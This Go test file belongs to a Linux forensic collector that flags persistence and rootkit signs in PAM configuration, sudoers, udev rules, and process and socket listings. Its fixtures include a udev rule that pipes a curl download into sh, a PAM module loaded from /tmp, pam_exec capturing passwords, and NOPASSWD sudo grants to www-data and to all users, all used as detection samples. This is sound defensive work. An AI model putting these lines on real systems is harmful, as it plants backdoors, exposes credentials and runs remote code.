//go:build linux

package collector

import (
	"context"
	"net"
	"strings"
	"testing"
)

func TestPAMLines(t *testing.T) {
	conf := `# PAM configuration for the Secure Shell service
@include common-auth
auth       required     pam_env.so user_readenv=1 envfile=/etc/default/locale
auth [success=1 default=ignore] pam_unix.so nullok
-session   optional     pam_systemd.so
auth       optional     /tmp/.x/pam_unix2.so
auth       optional     /opt/vendor/lib/pam_vendor.so
session    optional     pam_exec.so quiet /usr/local/bin/notify-login.sh
auth       optional     pam_exec.so expose_authtok /usr/local/bin/log.sh \
                          --verbose
`
	entries := parsePAMFile("/etc/pam.d/sshd", []byte(conf))
	if len(entries) != 7 {
		t.Fatalf("entries: %+v", entries)
	}
	if e := entries[1]; e.Control != "[success=1 default=ignore]" || e.Module != "pam_unix.so" || e.Args[0] != "nullok" {
		t.Errorf("bracketed control: %+v", e)
	}
	if e := entries[2]; e.Type != "session" || e.Module != "pam_systemd.so" {
		t.Errorf("leading dash: %+v", e)
	}
	if e := entries[6]; e.Line != 9 || strings.Join(e.Args, " ") != "expose_authtok /usr/local/bin/log.sh --verbose" {
		t.Errorf("continuation: %+v", e)
	}
	rules := map[string]string{}
	for _, e := range entries {
		for _, f := range judgePAMEntry(e) {
			rules[e.Module+" "+strings.Join(e.Args, " ")] += f.Rule + "/" + string(f.Severity) + " "
		}
	}
	if rules["/tmp/.x/pam_unix2.so "] != "persistence.pam_module/critical " ||
		rules["/opt/vendor/lib/pam_vendor.so "] != "persistence.pam_module/suspect " ||
		rules["pam_exec.so quiet /usr/local/bin/notify-login.sh"] != "persistence.pam_exec/notable " ||
		!strings.HasPrefix(rules["pam_exec.so expose_authtok /usr/local/bin/log.sh --verbose"], "persistence.pam_exec/suspect") {
		t.Errorf("judged: %v", rules)
	}
	if len(rules) != 4 {
		t.Errorf("ordinary lines judged: %v", rules)
	}

	if f, ok := pamModuleFinding("/lib/x86_64-linux-gnu/security/pam_unix.so", "aa", "bb", true); !ok || f.Rule != "persistence.pam_module_modified" || f.Severity != SevCritical {
		t.Errorf("modified: %+v", f)
	}
	if f, ok := pamModuleFinding("/lib/security/pam_x.so", "aa", "", false); !ok || f.Rule != "persistence.pam_module_unowned" {
		t.Errorf("unowned: %+v", f)
	}
	if _, ok := pamModuleFinding("/lib/security/pam_unix.so", "aa", "AA", true); ok {
		t.Error("matching checksum")
	}
}

func TestSudoers(t *testing.T) {
	data := `Defaults	env_reset
Defaults	secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
User_Alias ADMINS = alice, bob
root	ALL=(ALL:ALL) ALL
%sudo	ALL=(ALL:ALL) NOPASSWD: ALL
ubuntu ALL=(ALL) NOPASSWD:ALL
www-data ALL=(root) NOPASSWD: ALL
backup ALL=(ALL) NOPASSWD: /usr/bin/rsync, \
    /usr/bin/tar
ghost ALL = (ALL) NOPASSWD: SETENV: ALL
ALL ALL=(ALL) NOPASSWD: ALL
#includedir /etc/sudoers.d
`
	rules := parseSudoers("/etc/sudoers", []byte(data))
	if len(rules) != 7 {
		t.Fatalf("rules: %+v", rules)
	}
	if r := rules[4]; r.Who != "backup" || !r.NoPasswd || r.All || r.Line != 8 {
		t.Errorf("continuation and command list: %+v", r)
	}
	users := map[string]passwdEntry{
		"root": {Name: "root", Shell: "/bin/bash"}, "ubuntu": {Name: "ubuntu", UID: 1000, Shell: "/bin/bash"},
		"www-data": {Name: "www-data", UID: 33, Shell: "/usr/sbin/nologin"},
	}
	got := map[string]Severity{}
	for _, r := range rules {
		if f, ok := judgeSudoRule(r, users); ok {
			got[r.Who] = f.Severity
		}
	}
	want := map[string]Severity{"%sudo": SevNotable, "ubuntu": SevNotable, "www-data": SevSuspect, "ghost": SevSuspect, "ALL": SevCritical}
	if len(got) != len(want) {
		t.Fatalf("judged: %v", got)
	}
	for k, v := range want {
		if got[k] != v {
			t.Errorf("%s: %s, want %s", k, got[k], v)
		}
	}
}

func TestUdevRules(t *testing.T) {
	data := `# a comment RUN+="/bin/no"
SUBSYSTEM=="net", ACTION=="add", RUN+="/usr/bin/systemctl restart foo"
ACTION=="add", ENV{ID_BUS}=="usb", RUN+="/bin/sh -c 'curl -s http://198.51.100.9/x | sh'"
KERNEL=="sd*", PROGRAM="/opt/tools/namer %k", RUN{program}+="/home/bob/.cache/u"
ENV{RUN}=="1", TEST=="/run/x"
`
	cmds := udevRunCommands([]byte(data))
	if len(cmds) != 4 || cmds[0] != "/usr/bin/systemctl restart foo" || cmds[2] != "/home/bob/.cache/u" || cmds[3] != "/opt/tools/namer %k" {
		t.Fatalf("commands: %q", cmds)
	}
	if fs := judgeUdevCommand("/etc/udev/rules.d/99-x.rules", cmds[0]); len(fs) != 0 {
		t.Errorf("systemctl: %+v", fs)
	}
	fs := judgeUdevCommand("/etc/udev/rules.d/99-x.rules", cmds[1])
	if hasFinding(fs, "persistence.udev_run") == nil || len(fs) < 2 {
		t.Errorf("shell download: %+v", fs)
	}
	if fs := judgeUdevCommand("/etc/udev/rules.d/99-x.rules", cmds[3]); hasFinding(fs, "persistence.udev_run") == nil || fs[0].Severity != SevNotable {
		t.Errorf("program outside system dirs: %+v", fs)
	}
}

func TestHiddenDiffs(t *testing.T) {
	listed := map[int]bool{1: true, 2: true, 300: true}
	// 301 is a thread of 300 (answers, not listed, tgid 300); 4242 is hidden.
	if got := hiddenPIDs(listed, map[int]int{301: 300, 4242: 4242}); len(got) != 1 || got[0] != 4242 {
		t.Errorf("hidden pids: %v", got)
	}
	a := diagSocket{Proto: "tcp", Inode: 111, Local: "0.0.0.0:22"}
	b := diagSocket{Proto: "tcp", Inode: 222, Local: "0.0.0.0:31337"}
	c := diagSocket{Proto: "tcp", Inode: 333, Local: "10.0.0.5:51000"} // gone by the second dump
	got := hiddenSockets([]diagSocket{a, b, c}, []diagSocket{a, b}, map[string]bool{"tcp/111": true})
	if len(got) != 1 || got[0].Inode != 222 {
		t.Errorf("hidden sockets: %+v", got)
	}
}

// TestRootkitCollectorLive runs on this host: every PID is accounted for,
// netlink lists sockets, and a listening socket opened here is found in both
// views (nothing hidden).
func TestRootkitCollectorLive(t *testing.T) {
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer ln.Close()
	res := collectRootkit(context.Background())
	for _, e := range res.Errors {
		t.Logf("error: %s", e)
	}
	var summary map[string]any
	for _, r := range res.Records {
		if r.Fields["kind"] == "summary" {
			summary = r.Fields
		}
		for _, f := range r.Findings {
			t.Errorf("finding on a clean host: %s %s", f.Rule, f.Detail)
		}
	}
	if summary == nil || summary["pids_listed"].(int) < 1 || summary["probe_bound"].(int) < summary["pids_listed"].(int) {
		t.Fatalf("summary: %v", summary)
	}
	socks, err := allDiagSockets()
	if err != nil {
		t.Skipf("no sock_diag netlink here: %v", err)
	}
	port := ln.Addr().(*net.TCPAddr).Port
	found := false
	for _, s := range socks {
		if strings.HasSuffix(s.Local, ":"+itoa(port)) && s.Proto == "tcp" {
			found = true
			if !procNetKeys()[s.key()] {
				t.Errorf("our own listener %v isn't in /proc/net", s)
			}
		}
	}
	if !found {
		t.Errorf("netlink didn't list our listener on port %d among %d sockets", port, len(socks))
	}
	t.Logf("summary: %v", summary)
}
